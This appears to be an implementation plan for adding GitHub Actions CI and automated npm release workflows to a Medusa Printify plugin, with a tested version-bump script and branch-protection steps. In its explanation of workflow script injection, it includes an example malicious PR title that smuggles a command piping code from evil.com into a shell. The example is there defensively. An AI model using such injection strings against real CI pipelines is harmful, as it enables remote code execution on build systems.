# GitHub Actions CI/CD Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add two GitHub Actions workflows so every PR is verified (tests + build + PR-title lint) and merging a PR with a conventional-commit title auto-publishes the matching semver bump to npm via Trusted Publishers (OIDC), then tags and creates a GitHub Release.

**Architecture:** Two workflow files (`ci.yml` for PR-time checks, `release.yml` for post-merge publish). The release workflow extracts the bump-decision regex into a small shell script (`compute-bump.sh`) with its own test file (`compute-bump.test.sh`) so the only nontrivial logic is unit-testable. Auth uses npm Trusted Publishers — no `NPM_TOKEN` secret in GitHub. Branch protection plus PR-title lint plus a "version-field-guard" CI job together ensure CI is the sole authority on `package.json#version`.

**Tech Stack:** GitHub Actions, pnpm 10.18.3, Node 20, Bash, `jq`, `gh` CLI, `amannn/action-semantic-pull-request@v5`, `actions/checkout@v4`, `actions/setup-node@v4`, `pnpm/action-setup@v4`, npm Trusted Publishers (OIDC), npm `--provenance`.

**Reference spec:** `docs/superpowers/specs/2026-05-19-github-actions-ci-cd-design.md` (already committed).

**Working directory throughout:** `/Users/dcblackhouse/Code/ecommerce/medusa-plugin-printify`

**Branch:** Create and work on `feat/github-actions-ci-cd`.

---

## Task 1: Finish the in-flight `0.2.0` release manually (prerequisite)

The repo has a local commit and tag for `0.2.0` that were never published (npm token had expired). Clear that state before adopting CI — otherwise the local main is ahead of origin, and the first CI release will skip `0.2.0`.

**Files:** (none; manual operations)

- [ ] **Step 1: Refresh npm auth.** Run interactively in your terminal:

```bash
npm login
```
This opens a browser tab to npmjs.com for OAuth. Confirm in browser; the command writes a fresh `_authToken` to `~/.npmrc`.

- [ ] **Step 2: Verify auth.**

```bash
npm whoami
```
Expected: prints your npm username. If it 401s, the login did not complete — retry step 1.

- [ ] **Step 3: Publish the existing `0.2.0`.** From the plugin directory:

```bash
pnpm publish --access public
```
Expected: completes successfully with `+ medusa-plugin-printify@0.2.0`. `prepublishOnly` will rebuild the plugin first; harmless.

- [ ] **Step 4: Push the existing version commit and tag.**

```bash
git push --follow-tags
```
Expected: pushes commit `a701974` ("0.2.0") and tag `v0.2.0` to `origin/main`.

- [ ] **Step 5: Verify the public registry state.**

```bash
curl -s https://registry.npmjs.org/medusa-plugin-printify | jq -r '."dist-tags".latest'
```
Expected: `0.2.0`.

---

## Task 2: Create the work branch

**Files:** (none)

- [ ] **Step 1: Branch off `main`.**

```bash
git checkout main && git pull --ff-only
git checkout -b feat/github-actions-ci-cd
```
Expected: clean checkout, branch created, working tree clean.

---

## Task 3: Write the `compute-bump.sh` test file (TDD — failing test first)

The bump-decision logic is the only nontrivial behavior. We test it as a shell script before writing it.

**Files:**
- Create: `.github/scripts/compute-bump.test.sh`

- [ ] **Step 1: Create the test file.** Make the `.github/scripts/` directory and write the test:

```bash
mkdir -p .github/scripts
```

Then write `.github/scripts/compute-bump.test.sh`:

```bash
#!/usr/bin/env bash
# Tests for compute-bump.sh.
# Run: bash .github/scripts/compute-bump.test.sh

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SCRIPT="$SCRIPT_DIR/compute-bump.sh"

PASS=0
FAIL=0

assert_bump() {
    local description="$1"
    local title="$2"
    local body="$3"
    local expected="$4"
    local actual
    actual=$("$SCRIPT" "$title" <<< "$body")
    if [ "$actual" = "$expected" ]; then
        PASS=$((PASS+1))
        printf '  \033[32mPASS\033[0m  %s\n' "$description"
    else
        FAIL=$((FAIL+1))
        printf '  \033[31mFAIL\033[0m  %s\n        title=%q body=%q\n        expected=%q  actual=%q\n' \
            "$description" "$title" "$body" "$expected" "$actual"
    fi
}

echo "Running compute-bump.sh tests..."

# Patch (fix:)
assert_bump "fix: -> patch"                "fix: typo in logger"              ""  "patch"
assert_bump "fix(scope): -> patch"         "fix(printify): retry 429s"        ""  "patch"

# Minor (feat:)
assert_bump "feat: -> minor"               "feat: add variant pricing"        ""  "minor"
assert_bump "feat(scope): -> minor"        "feat(api): add endpoint"          ""  "minor"

# Major (feat!: or BREAKING CHANGE: in body)
assert_bump "feat!: -> major"              "feat!: rename option keys"        ""  "major"
assert_bump "feat(scope)!: -> major"       "feat(api)!: rename keys"          ""  "major"
assert_bump "fix!: -> major"               "fix!: drop legacy field"          ""  "major"
assert_bump "BREAKING CHANGE in body -> major"   "fix: refactor internals"  $'BREAKING CHANGE: removes config flag'   "major"
assert_bump "BREAKING-CHANGE in body -> major"   "fix: refactor internals"  $'BREAKING-CHANGE: removes config flag'   "major"
assert_bump "chore + BREAKING body -> major"     "chore: bump"              $'BREAKING CHANGE: caused by upgrade'     "major"

# Non-release prefixes
assert_bump "chore: -> empty"              "chore(deps): bump axios"          ""  ""
assert_bump "docs: -> empty"               "docs: update README"              ""  ""
assert_bump "test: -> empty"               "test: add unit tests"             ""  ""
assert_bump "ci: -> empty"                 "ci: tweak workflow"               ""  ""
assert_bump "refactor: -> empty"           "refactor: extract helper"         ""  ""
assert_bump "style: -> empty"              "style: format"                    ""  ""
assert_bump "perf: -> empty"               "perf: cache axios client"         ""  ""

# Invalid / no prefix
assert_bump "no colon -> empty"            "Fix typo in logger"               ""  ""
assert_bump "no space after colon -> empty" "fix:no-space"                    ""  ""
assert_bump "empty title -> empty"         ""                                 ""  ""
assert_bump "wrong case (Fix:) -> empty"   "Fix: capitalized prefix"          ""  ""

# Body containing the literal string mid-line should NOT trigger (must be at line start)
assert_bump "mid-line BREAKING -> not major"  "chore: bump"  "Some prose mentioning BREAKING CHANGE: in passing"  ""

echo
echo "Results: $PASS passed, $FAIL failed"
if [ "$FAIL" -gt 0 ]; then
    exit 1
fi
```

- [ ] **Step 2: Run the test to confirm it fails (script not yet present).**

```bash
bash .github/scripts/compute-bump.test.sh
```
Expected: every assertion fails (`compute-bump.sh` doesn't exist yet). Exit code: 1. Output ends with `Results: 0 passed, 22 failed`.

- [ ] **Step 3: Commit the failing test.**

```bash
chmod +x .github/scripts/compute-bump.test.sh
git add .github/scripts/compute-bump.test.sh
git commit -m "test: add tests for PR-title bump-decision script"
```

---

## Task 4: Implement `compute-bump.sh` to pass the tests

**Files:**
- Create: `.github/scripts/compute-bump.sh`

- [ ] **Step 1: Write the script.** Create `.github/scripts/compute-bump.sh`:

```bash
#!/usr/bin/env bash
# Determine the npm version bump level from a PR title and body.
#
# Usage:   compute-bump.sh "PR_TITLE" <<< "PR_BODY"
# Stdout:  one of 'patch', 'minor', 'major', or empty (no release).
# Exit:    0 always (caller checks output).
#
# Rules (per Conventional Commits):
#   - 'type!: ' or 'type(scope)!: ' in title              -> major
#   - 'BREAKING CHANGE:' or 'BREAKING-CHANGE:' at the     -> major
#     start of a line in the body
#   - 'fix: ' or 'fix(scope): ' in title                  -> patch
#   - 'feat: ' or 'feat(scope): ' in title                -> minor
#   - anything else                                       -> (empty)

set -uo pipefail

title="${1:-}"
body=""
if [ ! -t 0 ]; then
    body=$(cat)
fi

# Breaking change in title: 'type!: ' or 'type(scope)!: '
if [[ "$title" =~ ^[a-z]+(\([^\)]+\))?!:[[:space:]] ]]; then
    echo "major"
    exit 0
fi

# Breaking change footer at start of a line in body
if printf '%s\n' "$body" | grep -qE '^BREAKING[ -]CHANGE:'; then
    echo "major"
    exit 0
fi

# Patch: 'fix: ' or 'fix(scope): '
if [[ "$title" =~ ^fix(\([^\)]+\))?:[[:space:]] ]]; then
    echo "patch"
    exit 0
fi

# Minor: 'feat: ' or 'feat(scope): '
if [[ "$title" =~ ^feat(\([^\)]+\))?:[[:space:]] ]]; then
    echo "minor"
    exit 0
fi

exit 0
```

- [ ] **Step 2: Make it executable and run the tests.**

```bash
chmod +x .github/scripts/compute-bump.sh
bash .github/scripts/compute-bump.test.sh
```
Expected: all 22 assertions pass. Output ends with `Results: 22 passed, 0 failed`. Exit code: 0.

- [ ] **Step 3: Commit the implementation.**

```bash
git add .github/scripts/compute-bump.sh
git commit -m "feat: add PR-title bump-decision script"
```

---

## Task 5: Create the PR template

**Files:**
- Create: `.github/pull_request_template.md`

- [ ] **Step 1: Write the template.** Create `.github/pull_request_template.md`:

```markdown
## Summary

<!--
PR title format (drives the auto-release):
  fix:    -> patch release
  feat:   -> minor release
  feat!:  -> major release (or include 'BREAKING CHANGE:' at start of a line below)
  chore:, docs:, test:, ci:, refactor:, style:, perf:, build:, revert:  -> merge only, no release

Optional scope:  fix(printify): ...
-->

<short description of what this PR does and why>

## Test plan

- [ ] <how you verified this works>

## Notes

<!-- Include 'BREAKING CHANGE: ...' at the start of a line if this introduces a breaking change. -->
```

- [ ] **Step 2: Commit.**

```bash
git add .github/pull_request_template.md
git commit -m "chore: add PR template with conventional-commit guidance"
```

---

## Task 6: Create the `ci.yml` workflow

**Files:**
- Create: `.github/workflows/ci.yml`

- [ ] **Step 1: Create the directory and write the workflow.**

```bash
mkdir -p .github/workflows
```

Write `.github/workflows/ci.yml`:

```yaml
name: CI

on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]

permissions:
  contents: read

concurrency:
  group: ci-${{ github.head_ref }}
  cancel-in-progress: true

jobs:
  test:
    name: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: pnpm/action-setup@v4
        with:
          version: 10.18.3

      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: pnpm

      - name: Install dependencies
        run: pnpm install --frozen-lockfile

      - name: Run Jest tests
        run: pnpm test

      - name: Build plugin
        run: pnpm build

      - name: Run bump-script tests
        run: bash .github/scripts/compute-bump.test.sh

  pr-title-lint:
    name: pr-title-lint
    runs-on: ubuntu-latest
    permissions:
      pull-requests: read
    steps:
      - uses: amannn/action-semantic-pull-request@v5
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          types: |
            fix
            feat
            chore
            docs
            test
            ci
            refactor
            style
            perf
            build
            revert
          requireScope: false
          subjectPattern: ^[A-Za-z0-9].+$
          subjectPatternError: |
            The subject "{subject}" must start with an alphanumeric character.
            Example PR titles:
              fix: prevent null deref in catalog sync
              feat(printify): add variant pricing
              feat!: rename printify_id option
              docs: clarify README setup

  version-field-guard:
    name: version-field-guard
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Check that package.json#version is unchanged
        run: |
          # Compare against the merge-base (not BASE_SHA directly) so we only
          # flag changes the PR itself made. Otherwise, if another PR releases
          # while this PR is open and base.sha advances, the version field
          # would appear to have changed even though this PR didn't touch it.
          MERGE_BASE=$(git merge-base "${{ github.event.pull_request.base.sha }}" HEAD)
          BASE_VERSION=$(git show "$MERGE_BASE:package.json" | jq -r .version)
          HEAD_VERSION=$(jq -r .version package.json)
          if [ "$BASE_VERSION" != "$HEAD_VERSION" ]; then
            echo "::error file=package.json::package.json#version changed from $BASE_VERSION (merge base) to $HEAD_VERSION (PR head). CI is the sole authority on this field; remove the manual bump and let the release workflow handle it."
            exit 1
          fi
          echo "OK: package.json#version unchanged ($BASE_VERSION)."
```

- [ ] **Step 2: (Optional) Validate locally with actionlint.** If you have `actionlint` installed (`brew install actionlint`):

```bash
actionlint .github/workflows/ci.yml
```
Expected: no output (success). If actionlint is not installed, skip this — CI itself will fail loudly on syntax errors.

- [ ] **Step 3: Commit.**

```bash
git add .github/workflows/ci.yml
git commit -m "feat: add CI workflow (tests, PR title lint, version field guard)"
```

---

## Task 7: Create the `release.yml` workflow

**Files:**
- Create: `.github/workflows/release.yml`

- [ ] **Step 1: Write the workflow.** Create `.github/workflows/release.yml`:

```yaml
name: Release

on:
  pull_request:
    branches: [main]
    types: [closed]

permissions:
  contents: write
  id-token: write
  pull-requests: read

concurrency:
  group: release
  cancel-in-progress: false

jobs:
  release:
    name: release
    if: github.event.pull_request.merged == true
    runs-on: ubuntu-latest
    environment: npm-publish
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          ref: main

      - uses: pnpm/action-setup@v4
        with:
          version: 10.18.3

      - uses: actions/setup-node@v4
        with:
          node-version: 20
          registry-url: https://registry.npmjs.org/
          cache: pnpm

      - name: Determine bump from PR title
        id: bump
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_BODY: ${{ github.event.pull_request.body }}
        run: |
          BUMP=$(.github/scripts/compute-bump.sh "$PR_TITLE" <<< "$PR_BODY")
          echo "bump=$BUMP" >> "$GITHUB_OUTPUT"
          if [ -z "$BUMP" ]; then
            echo "PR title '$PR_TITLE' does not indicate a release. Exiting cleanly."
          else
            echo "Bump: $BUMP"
          fi

      - name: Bump package.json version
        if: steps.bump.outputs.bump != ''
        id: version
        run: |
          pnpm version "${{ steps.bump.outputs.bump }}" --no-git-tag-version
          NEW=$(jq -r .version package.json)
          echo "new=$NEW" >> "$GITHUB_OUTPUT"
          echo "New version: $NEW"

      - name: Install dependencies
        if: steps.bump.outputs.bump != ''
        run: pnpm install --frozen-lockfile

      - name: Run tests
        if: steps.bump.outputs.bump != ''
        run: pnpm test

      - name: Build plugin
        if: steps.bump.outputs.bump != ''
        run: pnpm build

      - name: Publish to npm (OIDC)
        if: steps.bump.outputs.bump != ''
        run: pnpm publish --access public --provenance --no-git-checks

      - name: Commit bump, tag, and push
        if: steps.bump.outputs.bump != ''
        run: |
          git config user.name  "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add package.json
          git commit -m "chore(release): v${{ steps.version.outputs.new }} [skip ci]"
          git tag -a "v${{ steps.version.outputs.new }}" -m "v${{ steps.version.outputs.new }}"
          git push origin main --follow-tags

      - name: Create GitHub Release
        if: steps.bump.outputs.bump != ''
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          gh release create "v${{ steps.version.outputs.new }}" \
            --generate-notes \
            --title "v${{ steps.version.outputs.new }}"
```

**Why each `if: steps.bump.outputs.bump != ''` guard:** PRs with non-release titles (e.g., `docs:`, `chore:`) should merge silently without bumping, publishing, tagging, or releasing. Gating every downstream step on the bump value makes the job a clean no-op in that case.

**Why `env: PR_TITLE` / `PR_BODY` instead of inline `${{ ... }}`:** PR titles and bodies are user-controlled. Inlining `${{ github.event.pull_request.title }}` directly into a shell command would allow a malicious title like `fix: x"; curl evil.com | sh #` to execute arbitrary code. Routing through an `env:` block prevents that — the value becomes a plain environment variable rather than interpolated into the shell command line.

- [ ] **Step 2: (Optional) Validate with actionlint.**

```bash
actionlint .github/workflows/release.yml
```

- [ ] **Step 3: Commit.**

```bash
git add .github/workflows/release.yml
git commit -m "feat: add release workflow with OIDC publish and auto-bump"
```

---

## Task 8: Remove the obsolete `release:*` scripts from `package.json`

**Files:**
- Modify: `package.json` (the `scripts` block, currently lines 30-41)

- [ ] **Step 1: Edit `package.json`.** Remove the three release scripts. The `scripts` block should change from:

```json
  "scripts": {
    "build": "medusa plugin:build",
    "dev": "medusa plugin:develop",
    "prepublishOnly": "medusa plugin:build",
    "publish:npm": "pnpm publish --access public --no-git-checks",
    "release:patch": "pnpm version patch && pnpm publish --access public && git push --follow-tags",
    "release:minor": "pnpm version minor && pnpm publish --access public && git push --follow-tags",
    "release:major": "pnpm version major && pnpm publish --access public && git push --follow-tags",
    "test": "jest",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage"
  },
```

to:

```json
  "scripts": {
    "build": "medusa plugin:build",
    "dev": "medusa plugin:develop",
    "prepublishOnly": "medusa plugin:build",
    "publish:npm": "pnpm publish --access public --no-git-checks",
    "test": "jest",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage"
  },
```

Keep `publish:npm` and `prepublishOnly` — both stay useful for emergency manual publishes if CI is down.

- [ ] **Step 2: Verify the JSON still parses.**

```bash
jq -e . package.json > /dev/null && echo "JSON valid"
```
Expected: `JSON valid`.

- [ ] **Step 3: Verify the scripts list no longer contains the removed entries.**

```bash
jq -r '.scripts | keys[]' package.json
```
Expected output (any order, no `release:patch`/`release:minor`/`release:major`):
```
build
dev
prepublishOnly
publish:npm
test
test:coverage
test:watch
```

- [ ] **Step 4: Commit.**

```bash
git add package.json
git commit -m "chore: remove obsolete release:* scripts (CI is sole release authority)"
```

---

## Task 9: Configure npm Trusted Publisher (manual, in browser)

This must happen before the release PR merges. It is fast and is a one-time per package configuration.

**Files:** (none; web UI)

- [ ] **Step 1: Sign in to npmjs.com** as the maintainer of `medusa-plugin-printify`.

- [ ] **Step 2: Navigate to the Trusted Publishers settings.**
   - Go to `https://www.npmjs.com/package/medusa-plugin-printify/access`.
   - Or: package page → **Settings** → **Trusted Publishers**.

- [ ] **Step 3: Add a GitHub Actions publisher.** Click **Add Trusted Publisher** → **GitHub Actions**, and enter exactly:

| Field | Value |
|---|---|
| Repository owner | `greedychipmunk` |
| Repository name | `medusa-plugin-printify` |
| Workflow filename | `release.yml` |
| Environment name | `npm-publish` |

Click **Add**.

- [ ] **Step 4: Verify the entry appears** in the Trusted Publishers list with the values above.

---

## Task 10: Create the `npm-publish` GitHub Environment (manual, in browser)

**Files:** (none; GitHub web UI)

- [ ] **Step 1: Open the Environments settings.** Navigate to `https://github.com/greedychipmunk/medusa-plugin-printify/settings/environments`.

- [ ] **Step 2: Create a new environment.** Click **New environment** → name it exactly `npm-publish` → **Configure environment**.

- [ ] **Step 3: Restrict to `main`.** Under **Deployment branches and tags**, choose **Selected branches and tags**, then **Add deployment branch or tag rule** → type `main` → save.

- [ ] **Step 4: (Optional) Add yourself as a required reviewer** under **Deployment protection rules** if you want a human gate before each publish. For solo workflow, leave empty.

- [ ] **Step 5: Save.**

---

## Task 11: Open the release PR and verify CI

**Files:** (none; git/GitHub operations)

- [ ] **Step 1: Push the branch.**

```bash
git push -u origin feat/github-actions-ci-cd
```

- [ ] **Step 2: Open the PR with a `feat:` title** (this triggers a minor bump on merge):

```bash
gh pr create \
  --base main \
  --title "feat: github actions ci/cd with trusted publisher" \
  --body "$(cat <<'EOF'
## Summary

- Add `ci.yml` running tests, build, PR-title lint, and version-field-guard on every PR.
- Add `release.yml` that parses the merged PR's conventional-commit title and auto-publishes the matching semver bump to npm via Trusted Publishers (OIDC), then tags and creates a GitHub Release.
- Add `compute-bump.sh` and shell-based tests for the bump-decision logic.
- Add PR template nudging contributors to the conventional title format.
- Remove obsolete `release:*` scripts from `package.json` (CI is now the sole release authority).

## Test plan

- [ ] CI workflow runs on this PR with `test`, `pr-title-lint`, and `version-field-guard` all green.
- [ ] After merge, `release.yml` publishes a `0.3.0` minor release with provenance.
- [ ] Tag `v0.3.0` exists on origin and a GitHub Release page is created.

🤖 Generated with [Claude Code](https://claude.com/claude-code)
EOF
)"
```

- [ ] **Step 3: Watch CI run** on the PR page. Verify all three checks turn green:
   - `test`
   - `pr-title-lint`
   - `version-field-guard`

If any fail, investigate logs in the GitHub Actions UI and fix on the branch.

- [ ] **Step 4: Merge the PR.** Use the GitHub UI; squash-merge is fine (recommended). The merge commit's message body doesn't matter — only the PR title is read by `release.yml`.

- [ ] **Step 5: Watch the `Release` workflow run.** Open the **Actions** tab; the new run should:
   1. Reach the `release` job (gated by `npm-publish` environment).
   2. Parse the bump: `Bump: minor`.
   3. Bump `package.json` to `0.3.0`.
   4. Install, test, build.
   5. Publish to npm via OIDC.
   6. Commit `chore(release): v0.3.0 [skip ci]` to `main`, push the commit and tag `v0.3.0`.
   7. Create a GitHub Release for `v0.3.0`.

- [ ] **Step 6: Verify on the public registry.**

```bash
curl -s https://registry.npmjs.org/medusa-plugin-printify | jq -r '."dist-tags".latest'
```
Expected: `0.3.0`.

```bash
curl -s https://registry.npmjs.org/medusa-plugin-printify/0.3.0 | jq '.dist | {tarball, integrity, signatures, attestations}'
```
Expected: shows `attestations` populated (proof that `--provenance` worked).

- [ ] **Step 7: Verify the tag and Release on GitHub.**

```bash
git fetch --tags && git tag -l v0.3.0
gh release view v0.3.0
```
Expected: tag listed, Release page shows autogenerated notes referencing this PR.

- [ ] **Step 8: Verify the Provenance badge** on `https://www.npmjs.com/package/medusa-plugin-printify` — there should be a "Provenance" indicator on the version `0.3.0`.

---

## Task 12: Enable branch protection on `main` (manual, in browser)

Now that all three CI checks have run at least once, they exist as selectable required status checks.

**Files:** (none; GitHub web UI)

- [ ] **Step 1: Open the branch protection settings.** Navigate to `https://github.com/greedychipmunk/medusa-plugin-printify/settings/branches` and either:
   - Click **Add branch protection rule**, or
   - (If using rulesets) **Settings** → **Rules** → **Rulesets** → **New ruleset** scoped to `main`.

- [ ] **Step 2: Configure the rule for `main`:**
   - **Branch name pattern:** `main`
   - **Require a pull request before merging:** ✅
   - **Require status checks to pass before merging:** ✅
     - **Require branches to be up to date before merging:** ✅
     - **Status checks that are required:** add `test`, `pr-title-lint`, `version-field-guard`.
   - **Do not allow bypassing the above settings:** ❌ (leave unchecked — we need the bot to bypass)

- [ ] **Step 3: Allow `github-actions[bot]` to bypass.** Under **Allow specified actors to bypass required pull requests** (classic branch protection) or **Bypass list** (rulesets), add `github-actions[bot]`. This is required so `release.yml` can push the version-bump commit and tag directly to `main` after a merge.

- [ ] **Step 4: Save the rule.**

- [ ] **Step 5: Verify by attempting a no-release PR.** Open a tiny throwaway PR with title `chore: verify branch protection`:

```bash
git checkout main && git pull
git checkout -b chore/verify-branch-protection
echo "" >> README.md   # any trivial change
git commit -am "chore: verify branch protection"
git push -u origin chore/verify-branch-protection
gh pr create --base main --title "chore: verify branch protection" --body "Verifies branch protection rules. No release expected on merge."
```

Confirm in the PR UI that the three checks are required (shown as required, not optional). Merge. Confirm in the **Actions** tab that `release.yml` triggers but exits cleanly with `PR title 'chore: verify branch protection' does not indicate a release. Exiting cleanly.` and no new version is published.

- [ ] **Step 6: Confirm no new npm version.**

```bash
curl -s https://registry.npmjs.org/medusa-plugin-printify | jq -r '."dist-tags".latest'
```
Expected: still `0.3.0` (chore PRs don't release).

---

## Self-Review

(For the implementer to run at the end.)

- [ ] **Spec coverage.** Open `docs/superpowers/specs/2026-05-19-github-actions-ci-cd-design.md` and confirm every item in the "Behavior matrix" was either tested in `compute-bump.test.sh` or directly verified during Task 11 / Task 12.
- [ ] **Failure recovery rehearsal (optional but recommended).** Once `0.3.0` is shipped, in a follow-up throwaway PR titled `fix: rehearse failure recovery`, temporarily make a Jest test fail and confirm `release.yml` fails before publish without leaving a bumped `package.json` on `main`. Revert the test in the same PR before merging for real.
- [ ] **Cleanup.** Delete the `feat/github-actions-ci-cd` branch (`gh pr merge` with `--delete-branch` covers this) and the `chore/verify-branch-protection` branch.

---

## Notes for Future Maintainers

- **To publish manually in an emergency** (e.g., CI is down): `pnpm publish:npm` from a clean checkout of `main` after `npm login`. This bypasses the OIDC flow and uses your personal token. Restore CI before the next normal release.
- **To skip a release on a PR that touches release-worthy code** (e.g., big refactor that you'll release later as part of a feature): title it `refactor: ...` or `chore: ...`. It merges silently; the next `fix:`/`feat:` PR carries the version bump.
- **To add a co-maintainer:** they need npm publish rights AND the GitHub Actions `npm-publish` environment may need a required-reviewer rule to gate publishes behind a second pair of eyes. Reconsider the environment's protection rules at that point.
